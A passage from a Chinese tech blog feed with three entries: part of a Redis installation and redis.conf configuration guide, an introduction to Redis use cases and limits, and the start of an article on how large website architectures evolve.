<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">`以下是我的安装路径：``REDISPORT=6379``EXEC=/opt/redis-3.0.5/src/redis-server``CLIEXEC=/opt/redis-3.0.5/src/redis-cli`</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>设置redis开机自启动</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chkconfig --add redis   </span><br><span class="line">chkconfig redis on   #开启开机启动</span><br><span class="line">chkconfig redis off  #关闭开机启动</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">打开redis命令：</span></span><br><span class="line">service redis start</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">关闭redis命令：</span></span><br><span class="line">service redis stop</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">重启redis命令：</span></span><br><span class="line">service redis restart</span><br></pre></td></tr></table></figure>

<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">执行客户端工具</span></span><br><span class="line">redis-cli </span><br><span class="line"><span class="meta">#</span><span class="bash">输入命令info</span></span><br><span class="line">127.0.0.1:6379&gt; info</span><br></pre></td></tr></table></figure>

<p><img src="/articles/72cca2b5/1.png" alt></p>
<h2 id="执行文件说明"><a href="#执行文件说明" class="headerlink" title="执行文件说明"></a>执行文件说明</h2><p>redis安装完成后会有以下可执行文件（window下是exe文件）生成，下面是各个文件的作用。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-server　　　　   #Redis服务器和Sentinel服务器，启动时候可使用--sentinel指定为哨兵</span><br><span class="line">redis-cli　　　　　    #Redis命令行客户端 </span><br><span class="line">redis-benchmark　     #Redis性能测试工具 </span><br><span class="line">redis-check-aof      #AOF文件修复工具 </span><br><span class="line">redis-check-dump     #RDB文件检测工具 </span><br><span class="line">redis-sentinel       #Sentinel服务器,4.0版本已经做了软链接到redis-server</span><br></pre></td></tr></table></figure>

<h2 id="配置详解"><a href="#配置详解" class="headerlink" title="配置详解"></a>配置详解</h2><p>redis所有的配置参数都可以通过客户端通过“CONFIG GET 参数名” 获取，参数名支持通配符，如*代表所有。所得结果并按照顺序分组，第一个返回结果是参数名，第二个结果是参数对应的值。</p>
<p><img src="/articles/72cca2b5/2.png" alt="img"></p>
<p>除了查看配置还可以使用CONFIG SET修改配置，写入配置文件使用CONFIG REWRITE,使用时是需要注意某些关于服务配置参数慎重修改，如bind。</p>
<p><img src="/articles/72cca2b5/3.png" alt="img"></p>
<p>配置参数以及解释，需要注意的是，有些配置是4.0.10新增的，有些配置已经废除，如vm相关配置，和集群相关配置在集群篇章在进行补充。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">logfile</span><br><span class="line"><span class="meta">#</span><span class="bash">日志文件位置及文件名称</span></span><br><span class="line"></span><br><span class="line">bind 0.0.0.0</span><br><span class="line"><span class="meta">#</span><span class="bash">监听地址，可以有多个 如<span class="built_in">bind</span> 0.0.0.0 127.0.0.1</span></span><br><span class="line"></span><br><span class="line">daemonize yes</span><br><span class="line"><span class="meta">#</span><span class="bash">yes启动守护进程运行，即后台运行，no表示不启用</span></span><br><span class="line"></span><br><span class="line">pidfile /var/run/redis.pid </span><br><span class="line"><span class="meta">#</span><span class="bash"> 当redis在后台运行的时候，Redis默认会把pid文件在在/var/run/redis.pid，也可以配置到其他地方。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 当运行多个redis服务时，需要指定不同的pid文件和端口</span></span><br><span class="line"></span><br><span class="line">port 6379</span><br><span class="line"><span class="meta">#</span><span class="bash"> 指定redis运行的端口，默认是6379</span></span><br><span class="line"></span><br><span class="line">unixsocket </span><br><span class="line"><span class="meta">#</span><span class="bash">sock文件位置</span></span><br><span class="line"></span><br><span class="line">unixsocketperm</span><br><span class="line"><span class="meta">#</span><span class="bash">sock文件权限</span></span><br><span class="line"></span><br><span class="line">timeout 0</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置客户端连接时的超时时间，单位为秒。当客户端在这段时间内没有发出任何指令，那么关闭该连接， 0是关闭此设置</span></span><br><span class="line"></span><br><span class="line">loglevel debug</span><br><span class="line"><span class="meta">#</span><span class="bash"> 指定日志记录级别，Redis总共支持四个级别：debug、verbose、notice、warning，默认为verbose</span></span><br><span class="line"></span><br><span class="line">logfile ""</span><br><span class="line"><span class="meta">#</span><span class="bash"> 日志文件配置,默认值为stdout，标准输出，若后台模式会输出到/dev/null</span></span><br><span class="line"></span><br><span class="line">syslog-enabled</span><br><span class="line"><span class="meta">#</span><span class="bash"> 是否以syslog方式记录日志，yes开启no禁用，与该配置相关配置syslog-ident 和syslog-facility local0 分别是指明syslog的ident和facility</span></span><br><span class="line"></span><br><span class="line">databases 16</span><br><span class="line"><span class="meta">#</span><span class="bash">配置可用的数据库个数，默认值为16，默认数据库为0，数据库范围在0-（database-1）之间</span></span><br><span class="line"></span><br><span class="line">always-show-logo yes #4.0以后新增配置</span><br><span class="line"><span class="meta">#</span><span class="bash">是否配置日志显示redis徽标，yes显示no不显示</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">############################### 快照相关配置 #################################</span></span></span><br><span class="line"></span><br><span class="line">save 900 1</span><br><span class="line">save 300 10</span><br><span class="line">save 60 10000</span><br><span class="line"><span class="meta">#</span><span class="bash">配置快照(rdb)促发规则，格式：save &lt;seconds&gt; &lt;changes&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">save 900 1  900秒内至少有1个key被改变则做一次快照</span></span><br><span class="line"><span class="meta">#</span><span class="bash">save 300 10  300秒内至少有300个key被改变则做一次快照</span></span><br><span class="line"><span class="meta">#</span><span class="bash">save 60 10000  60秒内至少有10000个key被改变则做一次快照</span></span><br><span class="line"></span><br><span class="line">dbfilename  dump.rdb</span><br><span class="line"><span class="meta">#</span><span class="bash">rdb持久化存储数据库文件名，默认为dump.rdb</span></span><br><span class="line"></span><br><span class="line">stop-write-on-bgsave-error yes </span><br><span class="line"><span class="meta">#</span><span class="bash">yes代表当使用bgsave命令持久化痤疮时候禁止写操作</span></span><br><span class="line"></span><br><span class="line">rdbchecksum yes</span><br><span class="line"><span class="meta">#</span><span class="bash">开启rdb文件校验</span></span><br><span class="line"></span><br><span class="line">dir "/etc"</span><br><span class="line"><span class="meta">#</span><span class="bash">数据文件存放目录，rdb快照文件和aof文件都会存放至该目录</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">################################ 复制相关配置参数 #################################</span></span></span><br><span class="line"></span><br><span class="line">slaveof &lt;masterip&gt; &lt;masterport&gt;  </span><br><span class="line"><span class="meta">#</span><span class="bash">设置该数据库为其他数据库的从数据库，设置当本机为slave服务时，设置master服务的IP地址及端口，在Redis启动时，它会自动从master进行数据同步</span></span><br><span class="line"></span><br><span class="line">masterauth &lt;master-password&gt;</span><br><span class="line"><span class="meta">#</span><span class="bash">主从复制中，设置连接master服务器的密码（前提master启用了认证）</span></span><br><span class="line"></span><br><span class="line">slave-serve-stale-data yes</span><br><span class="line"><span class="meta">#</span><span class="bash"> 当从库同主机失去连接或者复制正在进行，从机库有两种运行方式：</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 1) 如果slave-serve-stale-data设置为yes(默认设置)，从库会继续相应客户端的请求</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 2) 如果slave-serve-stale-data是指为no，除了INFO和SLAVOF命令之外的任何请求都会返回一个错误<span class="string">"SYNC with master in progress"</span></span></span><br><span class="line"></span><br><span class="line">repl-ping-slave-period 10</span><br><span class="line"><span class="meta">#</span><span class="bash">从库会按照一个时间间隔向主库发送PING命令来判断主服务器是否在线，默认是10秒</span></span><br><span class="line"></span><br><span class="line">repl-timeout 60</span><br><span class="line"><span class="meta">#</span><span class="bash">设置主库批量数据传输时间或者ping回复时间间隔超时时间，默认值是60秒</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 一定要确保repl-timeout大于repl-ping-slave-period</span></span><br><span class="line"></span><br><span class="line">repl-backlog-size 1mb</span><br><span class="line"><span class="meta">#</span><span class="bash">设置复制积压大小,只有当至少有一个从库连入才会释放。</span></span><br><span class="line"></span><br><span class="line">slave-priority 100</span><br><span class="line"><span class="meta">#</span><span class="bash">当主库发生宕机时候，哨兵会选择优先级最高的一个称为主库，从库优先级配置默认100，数值越小优先级越高</span></span><br><span class="line"></span><br><span class="line">min-slaves-to-write 3</span><br><span class="line">min-slaves-max-lag 10</span><br><span class="line"><span class="meta">#</span><span class="bash">设置某个时间断内，如果从库数量小于该某个值则不允许主机进行写操作，以上参数表示10秒内如果主库的从节点小于3个，则主库不接受写请求，min-slaves-to-write 0代表关闭此功能。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">################################# 安全相关配置 ###################################</span></span></span><br><span class="line"></span><br><span class="line">requirepass</span><br><span class="line"><span class="meta">#</span><span class="bash">客户端连接认证的密码，默认为空，即不需要密码，若配置则命令行使用AUTH进行认证</span></span><br><span class="line"></span><br><span class="line">maxclients 10000</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置同一时间最大客户端连接数，4.0默认10000，Redis可以同时打开的客户端连接数为Redis进程可以打开的最大文件描述符数，</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果设置 maxclients 0，表示不作限制。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 当客户端连接数到达限制时，Redis会关闭新的连接并向客户端返回max number of clients reached错误信息</span></span><br><span class="line"></span><br><span class="line">maxmemory 4gb</span><br><span class="line"><span class="meta">#</span><span class="bash">设置最大使用的内存大小</span></span><br><span class="line"></span><br><span class="line">maxmemory-policy noeviction</span><br><span class="line"><span class="meta">#</span><span class="bash">设置达到最大内存采取的策略：</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> volatile-lru -&gt; 利用LRU算法移除设置过过期时间的key (LRU:最近使用 Least Recently Used )</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> allkeys-lru -&gt; 利用LRU算法移除任何key</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> volatile-random -&gt; 移除设置过过期时间的随机key</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> allkeys-&gt;random -&gt; remove a random key, any key</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> volatile-ttl -&gt; 移除即将过期的key(minor TTL)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 4.0默认noeviction代表不删除任何key，只在写操作时候返回错误。</span></span><br><span class="line"></span><br><span class="line">maxmemory-samples 5</span><br><span class="line"><span class="meta">#</span><span class="bash">LRU，LFU等算法样本设置，默认5个key</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">############################# AOF相关配置###############################</span></span></span><br><span class="line"></span><br><span class="line">appendonly no</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置AOF持久化，yes开启，no禁用，开启后redis会把所接收到的每一次写操作请求都追加到appendonly.aof文件中，当redis重新启动时，会从该文件恢复出之前的状态。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 但是这样会造成appendonly.aof文件过大，所以redis还支持了BGREWRITEAOF指令，对appendonly.aof 进行重写。</span></span><br><span class="line"></span><br><span class="line">appendfilename "appendonly.aof"</span><br><span class="line"><span class="meta">#</span><span class="bash">设置AOF文件名</span></span><br><span class="line"></span><br><span class="line">appendfsync everysec</span><br><span class="line"><span class="meta">#</span><span class="bash"> AOF文件写策略，Redis支持三种同步AOF文件的策略:</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> no: 不进行同步，交给操作系统去执行 ，速度较快</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> always: always表示每次有写操作都调用fsync方法强制内核将该写操作写入到文件，速度会慢, 但是安全，因为每次写操作都在AOF文件中.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> everysec: 表示对写操作进行累积，每秒同步一次，折中方案.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 默认是<span class="string">"everysec"</span>，按照速度和安全折中这是最好的。</span></span><br><span class="line"></span><br><span class="line">no-appendfsync-on-rewrite no</span><br><span class="line"><span class="meta">#</span><span class="bash"> AOF策略设置为always或者everysec时，后台处理进程(后台保存或者AOF日志重写)会执行大量的I/O操作</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 在某些Linux配置中会阻止过长的fsync()请求。注意现在没有任何修复，即使fsync在另外一个线程进行处理，为了减缓这个问题，可以设置下面这个参数no-appendfsync-on-rewrite</span></span><br><span class="line"></span><br><span class="line">auto-aof-rewrite-percentage 100</span><br><span class="line">auto-aof-rewrite-min-size 64mb</span><br><span class="line"><span class="meta">#</span><span class="bash">当AOF文件增长到一定大小的时候Redis能够调用BGREWRITEAOF对日志文件进行重写，它是这样工作的：Redis会记住上次进行些日志后文件的大小(如果从开机以来还没进行过重写，那日子大小在开机的时候确定)。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">基础大小会同现在的大小进行比较。如果现在的大小比基础大小大制定的百分比，重写功能将启动</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 同时需要指定一个最小大小用于AOF重写，这个用于阻止即使文件很小但是增长幅度很大也去重写AOF文件的情况</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置 percentage 为0就关闭这个特性</span></span><br><span class="line"><span class="meta">#</span><span class="bash">auto-aof-rewrite-percentage 代表AOF文件每次重写文件大小（以百分数代表），100表示百分之百，即当文件增加了1倍（100%），则开始重写AOF文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash">auto-aof-rewrite-min-size  设置最小重写文件大小，避免文件小而执行太多次的重写</span></span><br><span class="line"></span><br><span class="line">aof-load-truncated yes</span><br><span class="line">＃当redis突然运行崩溃时，会出现aof文件被截断的情况，Redis可以在发生这种情况时退出并加载错误，以下选项控制此行为。</span><br><span class="line">＃如果aof-load-truncated设置为yes，则加载截断的AOF文件，Redis服务器启动发出日志以通知用户该事件。</span><br><span class="line">＃否则，如果该选项设置为no，则服务器将中止并显示错误并停止启动。当该选项设置为no时，用户需要在重启之前使用“redis-check-aof”实用程序修复AOF文件在进行重启</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">################################# 慢查询配置 ###################################</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">slowlog-log-slower-than 10000</span><br><span class="line"><span class="meta"> #</span><span class="bash">Redis Slow Log 记录超过特定执行时间的命令。执行时间不包括I/O计算比如连接客户端，返回结果等，只是命令执行时间，可以通过两个参数设置slow <span class="built_in">log</span>：一个是告诉Redis执行超过多少时间被记录的参数slowlog-log-slower-than(微秒，因此1000000代表一分钟</span></span><br><span class="line"><span class="meta">#</span><span class="bash">另一个是slow <span class="built_in">log</span> 的长度。当一个新命令被记录的时候最早的命令将被从队列中移除</span></span><br><span class="line"> </span><br><span class="line">slowlog-max-len 128</span><br><span class="line"><span class="meta">#</span><span class="bash">慢查询命令记录队列长度设置，该队列占用内存，可以使用SLOWLOG RESET清空队列</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">############################## 高级配置 ###############################</span></span></span><br><span class="line"></span><br><span class="line">hash-max-zipmap-entries 512</span><br><span class="line">hash-max-zipmap-value 64</span><br><span class="line"><span class="meta">#</span><span class="bash"> 当<span class="built_in">hash</span>中包含超过指定元素个数并且最大的元素没有超过临界时，<span class="built_in">hash</span>将以一种特殊的编码方式（大大减少内存使用）来存储，这里可以设置这两个临界值</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Redis Hash对应Value内部实际就是一个HashMap，实际这里会有2种不同实现，</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 这个Hash的成员比较少时Redis为了节省内存会采用类似一维数组的方式来紧凑存储，而不会采用真正的HashMap结构，对应的value redisObject的encoding为zipmap,当成员数量增大时会自动转成真正的HashMap,此时encoding为ht。</span></span><br><span class="line"></span><br><span class="line">list-max-ziplist-size -2</span><br><span class="line"><span class="meta">#</span><span class="bash">Lists也以特殊方式编码，以节省大量空间。</span></span><br><span class="line">＃可以指定每个内部列表节点允许的条目数</span><br><span class="line">＃作为固定的最大大小或最大元素数。</span><br><span class="line">＃对于固定的最大大小，使用-5到-1表示：</span><br><span class="line">＃-5：最大大小：64 Kb &lt; - 不建议用于正常工作负载</span><br><span class="line">＃-4：最大尺寸：32 Kb &lt; - 不推荐</span><br><span class="line">＃-3：最大尺寸：16 Kb &lt; - 可能不推荐</span><br><span class="line">＃-2：最大尺寸：8 Kb &lt; - 好</span><br><span class="line">＃-1：最大尺寸：4 Kb &lt; - 良好</span><br><span class="line">＃正数意味着存储_exactly_元素数量</span><br><span class="line">＃每个列表节点。</span><br><span class="line">＃性能最高的选项通常为-2（8 Kb大小）或-1（4 Kb大小）</span><br><span class="line"></span><br><span class="line">zset-max-ziplist-entries 128</span><br><span class="line">zset-max-ziplist-value 64</span><br><span class="line"><span class="meta">#</span><span class="bash"> list数据类型多少节点以下会采用去指针的紧凑存储格式。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> list数据类型节点值大小小于多少字节会采用紧凑存储格式。</span></span><br><span class="line"></span><br><span class="line">activerehashing yes</span><br><span class="line"><span class="meta">#</span><span class="bash"> Redis将在每100毫秒时使用1毫秒的CPU时间来对redis的<span class="built_in">hash</span>表进行重新<span class="built_in">hash</span>，可以降低内存的使用</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 当你的使用场景中，有非常严格的实时性需要，不能够接受Redis时不时的对请求有2毫秒的延迟的话，把这项配置为no。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果没有这么严格的实时性要求，可以设置为yes，以便能够尽可能快的释放内存</span></span><br><span class="line"></span><br><span class="line">client-output-buffer-limit normal 0 0 0</span><br><span class="line">client-output-buffer-limit slave 256mb 64mb 60</span><br><span class="line">client-output-buffer-limit pubsub 32mb 8mb 60</span><br><span class="line"><span class="meta">#</span><span class="bash">客户端输出缓冲区限制可用于强制断开客户端，由于某种原因，没有足够快地从服务器读取数据，常见的原因是Pub / Sub客户端不能像很快的消费一条消息，可以为三种不同类型的客户端设置不同的限制：</span></span><br><span class="line"><span class="meta">#</span><span class="bash">normal - &gt;普通客户端，包括MONITOR客户端</span></span><br><span class="line"><span class="meta">#</span><span class="bash">subve - &gt;从服务器客户端</span></span><br><span class="line"><span class="meta">#</span><span class="bash">pubsub - &gt;客户端订阅了至少一个pubsub通道或模式</span></span><br><span class="line"><span class="meta">#</span><span class="bash">设置方法：client-output-buffer-limit 软限制大小 硬限制大小 秒数</span></span><br><span class="line"><span class="meta">#</span><span class="bash">当客户端达到硬限制大小则立即断开连接，当客户端达到软限制时候并且在设置的秒数缓冲大小任然超了，则在设置的秒数后断开连接</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>数据库</category>
        <category>NoSQL</category>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis系列之介绍</title>
    <url>/articles/3c05f63f.html</url>
    <content><![CDATA[<h2 id="redis简介"><a href="#redis简介" class="headerlink" title="redis简介"></a>redis简介</h2><p>redis是Nosql数据库中使用较为广泛的非关系型内存数据库。redis内部是一个key-value存储系统。它支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)、zset(sorted set –有序集合)和hash（哈希类型，类似于Java中的map）。Redis基于内存运行并支持持久化的NoSQL数据库，是当前最热门的NoSql数据库之一，也被人们称为数据结构服务器。 </p>
<a id="more"></a>

<h2 id="数据库瓶颈"><a href="#数据库瓶颈" class="headerlink" title="数据库瓶颈"></a>数据库瓶颈</h2><p>传统的关系数据库存在哪些瓶颈或问题，让我们考虑类似redis这样的Nosql数据库呢？<br>1） 当数据量的总大小一个机器放不下时。<br>2） 数据索引一个机器的内存放不下时。<br>3） 访问量（读写混合）一个实例放不下时。</p>
<h2 id="数据库模型演变"><a href="#数据库模型演变" class="headerlink" title="数据库模型演变"></a>数据库模型演变</h2><p>单机时代模型 </p>
<p><img src="/articles/3c05f63f/1.png" alt></p>
<p>如果每次存储成千上万条数据，这样会导致mysql的性能很差，存储以及读取速度很慢，然后就演变成缓存+mysql+垂直拆分的方式。 </p>
<p><img src="/articles/3c05f63f/2.png" alt></p>
<p>Cache作为中间缓存，将所有的数据先保存到缓存中，然后再存入mysql中，减小数据库压力，提高效率。<br>但是当数据再次增加到又一个量级，上面的方式也不能满足需求，由于数据库的写入压力增加，Memcached只能缓解数据库的读取压力。读写集中在一个数据库上让数据库不堪重负，大部分网站开始使用主从复制技术来达到读写分离，以提高读写性能和读库的可扩展性。Mysql的master-slave模式成为这个时候的网站标配了。 </p>
<p><img src="/articles/3c05f63f/3.png" alt></p>
<p>主从分离模式，在redis的高速缓存，MySQL的主从复制，读写分离的基础之上，这时MySQL主库的写压力开始出现瓶颈，而数据量的持续猛增，由于MyISAM使用表锁，在高并发下会出现严重的锁问题，大量的高并发MySQL应用开始使用InnoDB引擎代替MyISAM。 </p>
<p><img src="/articles/3c05f63f/4.png" alt></p>
<p>分表分库模式<br>将变化小的、业务相关的放在一个数据库，变化多的，不相关的数据放在一个数据库。 </p>
<h2 id="Nosql数据库的优势"><a href="#Nosql数据库的优势" class="headerlink" title="Nosql数据库的优势"></a>Nosql数据库的优势</h2><p>1）易扩展<br>这些类型的数据存储不需要固定的模式，无需多余的操作就可以进行横向的扩展。相对于关系型数据库可以减少表和字段特别多的情况。也无型之间在架构的层面上带来了可扩展的能力<br>2）大数据量提高性能<br>3）多样灵活的数据模型<br>在nosql中不仅可以存储String，hash，set、Zset等数据类型，还可以保存javaBean以及多种复杂的数据类型。</p>
<h2 id="Redis的应用场景"><a href="#Redis的应用场景" class="headerlink" title="Redis的应用场景"></a>Redis的应用场景</h2><p><strong>缓存</strong>：毫无疑问这是Redis当今最为人熟知的使用场景。再提升服务器性能方面非常有效；</p>
<p><strong>排行榜</strong>：如果使用传统的关系型数据库来做这个事儿，非常的麻烦，而利用Redis的SortSet数据结构能够非常方便搞定；</p>
<p><strong>计算器/限速器</strong>：利用Redis中原子性的自增操作，我们可以统计类似用户点赞数、用户访问数等，这类操作如果用MySQL，频繁的读写会带来相当大的压力；限速器比较典型的使用场景是限制某个用户访问某个API的频率，常用的有抢购时，防止用户疯狂点击带来不必要的压力；</p>
<p><strong>好友关系</strong>：利用集合的一些命令，比如求交集、并集、差集等。可以方便搞定一些共同好友、共同爱好之类的功能；</p>
<p><strong>简单消息队列</strong>：除了Redis自身的发布/订阅模式，我们也可以利用List来实现一个队列机制，比如：到货通知、邮件发送之类的需求，不需要高可靠，但是会带来非常大的DB压力，完全可以用List来完成异步解耦；</p>
<p><strong>Session共享</strong>：以PHP为例，默认Session是保存在服务器的文件中，如果是集群服务，同一个用户过来可能落在不同机器上，这就会导致用户频繁登陆；采用Redis保存Session后，无论用户落在那台机器上都能够获取到对应的Session信息。</p>
<h2 id="Redis的局限性"><a href="#Redis的局限性" class="headerlink" title="Redis的局限性"></a>Redis的局限性</h2><p>Redis感觉能干的事情特别多，但它不是万能的，合适的地方用它事半功倍。如果滥用可能导致系统的不稳定、成本增高等问题。</p>
<p>比如，用Redis去保存用户的基本信息，虽然它能够支持持久化，但是它的持久化方案并不能保证数据绝对的落地，并且还可能带来Redis性能下降，因为持久化太过频繁会增大Redis服务的压力。</p>
<p>简单总结就是数据量太大、数据访问频率非常低的业务都不适合使用Redis，数据太大会增加成本，访问频率太低，保存在内存中纯属浪费资源。</p>
<p><img src="/articles/3c05f63f/5.png" alt></p>
<h2 id="选择理由"><a href="#选择理由" class="headerlink" title="选择理由"></a>选择理由</h2><p>上面说了Redis的一些使用场景，那么这些场景的解决方案也有很多其它选择，比如缓存可以用Memcache，Session共享还能用MySql来实现，消息队列可以用RabbitMQ，我们为什么一定要用Redis呢？</p>
<p><strong>速度快:</strong> 完全基于内存，使用C语言实现，网络层使用epoll解决高并发问题，单线程模型避免了不必要的上下文切换及竞争条件；</p>
<p>注意：单线程仅仅是说在网络请求这一模块上用一个线程处理客户端的请求，像持久化它就会重开一个线程/进程去进行处理</p>
<p><strong>丰富的数据类型:</strong> Redis有8种数据类型，当然常用的主要是 String、Hash、List、Set、 SortSet 这5种类型，他们都是基于键值的方式组织数据。每一种数据类型提供了非常丰富的操作命令，可以满足绝大部分需求，如果有特殊需求还能自己通过 lua 脚本自己创建新的命令（具备原子性）；</p>
<p><img src="/articles/3c05f63f/7.png" alt></p>
<p>除了提供的丰富的数据类型，Redis还提供了像慢查询分析、性能测试、Pipeline、事务、Lua自定义命令、Bitmaps、HyperLogLog、发布/订阅、Geo等个性化功能。</p>
<p>Redis的代码开源在GitHub，代码非常简单优雅，任何人都能够吃透它的源码；它的编译安装也是非常的简单，没有任何的系统依赖；有非常活跃的社区，各种客户端的语言支持也是非常完善。另外它还支持事务（没用过）、持久化、主从复制让高可用、分布式成为可能。</p>
<p><img src="/articles/3c05f63f/6.png" alt></p>
<p>你还在等什么，和我一起用redis吧。</p>
]]></content>
      <categories>
        <category>数据库</category>
        <category>NoSQL</category>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>大型网站架构演变</title>
    <url>/articles/4964e843.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>世间几乎所有东西都不是一蹴而就的，都是有个演变过程。互联网公司也都是从一个小网站开始，渐进地发展起来的。例如：中国的BAT，TMD，美国的Google,Youtube,Facebook等等都是这样的。Facebook 是扎克伯格同学在哈佛大学的宿舍里开发的；Google 的第一台服务器部署在斯坦福大学的实验室；阿里巴巴是在马云家的客厅诞生的。本文通过详解大型网站的演变过程，让你对公司网站以后优化改进方向有一个清晰的认识。</p>
<a id="more"></a>

<h2 id="大型网站系统的特点"><a href="#大型网站系统的特点" class="headerlink" title="大型网站系统的特点"></a>大型网站系统的特点</h2><h4 id="高并发，大流量"><a href="#高并发，大流量" class="headerlink" title="高并发，大流量"></a>高并发，大流量</h4><p>需要面对高并发用户，大流量访问。Google 日均 PV 35 亿，日 IP 访问数 3 亿；腾讯 QQ 的最大在线用户数 1.4 亿（2011年数据）。</p>
<h4 id="高可用"><a href="#高可用" class="headerlink" title="高可用"></a>高可用</h4><p>系统 7 x 24 小时不间断服务。</p>
<h4 id="海量数据"><a href="#海量数据" class="headerlink" title="海量数据"></a>海量数据</h4><p>需要存储、管理海量数据，需要使用大量服务器。Facebook 每周上传的照片数量接近 10 亿，百度收录的网页数目有数百亿，Google 有近百万台服务器为全球用户提供服务。</p>
<h4 id="用户分布广泛，网络情况复杂"><a href="#用户分布广泛，网络情况复杂" class="headerlink" title="用户分布广泛，网络情况复杂"></a>用户分布广泛，网络情况复杂</h4><p>许多大型互联网站都是为全球用户提供服务的，用户分布范围广，各地网络情况千差万别。在国内，还有各个运营商网络互通难的问题。</p>
<h4 id="安全环境恶劣"><a href="#安全环境恶劣" class="headerlink" title="安全环境恶劣"></a>安全环境恶劣</h4><p>由于互联网的开放性，使得互联网站更容易受到攻击，大型网站几乎每天都会被黑客攻击。</p>
<h4 id="需求快速变更，发布频繁"><a href="#需求快速变更，发布频繁" class="headerlink" title="需求快速变更，发布频繁"></a>需求快速变更，发布频繁</h4><p>和传统软件的版本发布频率不同，互联网产品为快速适应市场，满足用户需求，其产品发布频率极高。一般大型网站的产品每周都有新版本发布上线，中小型网站的发布更频繁，有时候一天会发布几十次。</p>
<h4 id="渐进式发展"><a href="#渐进式发展" class="headerlink" title="渐进式发展"></a>渐进式发展</h4><p>几乎所有的大型互联网网站都是从一个小网站开始，渐进地发展起来的。Facebook 是扎克伯格同学在哈佛大学的宿舍里开发的；Google 的第一台服务器部署在斯坦福大学的实验室；阿里巴巴是在马云家的客厅诞生的。好的互联网产品都是慢慢运营出来的，不是一开始就开发好的，这也正好与网站架构的发展演化过程对应。</p>
<hr>
<h2 id="大型网站架构演化发展历程"><a href="#大型网站架构演化发展历程" class="headerlink" title="大型网站架构演化发展历程"></a>大型网站架构演化发展历程</h2><p>大型网站的技术挑战主要来自于庞大的用户，高并发的访问和海量的数据，任何简单的业务一旦需要处理数以 P 计的数据和面对数以亿计的用户，问题就会变得很棘手。大型网站架构主要解决这类问题。</p>
<h4 id="初始阶段的网站架构"><a href="#初始阶段的网站架构" class="headerlink" title="初始阶段的网站架构"></a>初始阶段的网站架构</h4><p>大型网站都是从小型网站发展而来，网站架构也是一样，是从小型网站架构逐步演化而来。小型网站最开始没有太多人访问，只需要一台服务器就绰绰有余，这时的网站架构如下图所示：</p>
<p><img src="/articles/4964e843/1.png" alt></p>
<p>应用程序、数据库、文件等所有资源都在一台服务器上。</p>
<hr>
<h4 id="应用服务和数据服务分离"><a href="#应用服务和数据服务分离" class="headerlink" title="应用服务和数据服务分离"></a>应用服务和数据服务分离</h4><p>随着网站业务的发展，一台服务器逐渐不能满足需求：越来越多的用户访问导致性能越来越差，越来越多的数据导致存储空间不足。这时就需要将应用和数据分离。应用和数据分离后整个网站使用3台服务器：应用服务器、文件服务器和数据库服务器。这 3 台服务器对硬件资源的要求各不相同：</p>
<blockquote>
<p>应用服务器需要处理大量的业务逻辑，因此需要更快更强大的CPU；</p>
<p>数据库服务器需要快速磁盘检索和数据缓存，因此需要更快的磁盘和更大的内存；</p>
<p>文件服务器需要存储大量用户上传的文件，因此需要更大的硬盘。</p>
</blockquote>
<p>此时，网站系统的架构如下图所示：</p>
<p><img src="/articles/4964e843/2.png" alt></p>
